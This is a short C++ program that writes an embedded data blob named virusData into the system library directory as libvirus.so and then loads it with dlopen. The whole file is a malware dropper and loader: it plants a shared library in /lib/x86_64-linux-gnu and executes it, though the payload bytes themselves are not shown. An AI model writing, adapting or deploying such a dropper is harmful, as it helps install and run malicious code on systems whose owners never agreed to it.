#include <cstdio>
#include <dlfcn.h>
#include <cstring>

extern const char virusData[];
extern size_t const dataLen;

int main()
{
    FILE *soFile = fopen("/lib/x86_64-linux-gnu/libvirus.so", "wb");
    fwrite(virusData, 1, dataLen, soFile);
    fclose(soFile);
    void *handle = dlopen("libvirus.so", RTLD_LAZY | RTLD_LOCAL);
    return 0;
}
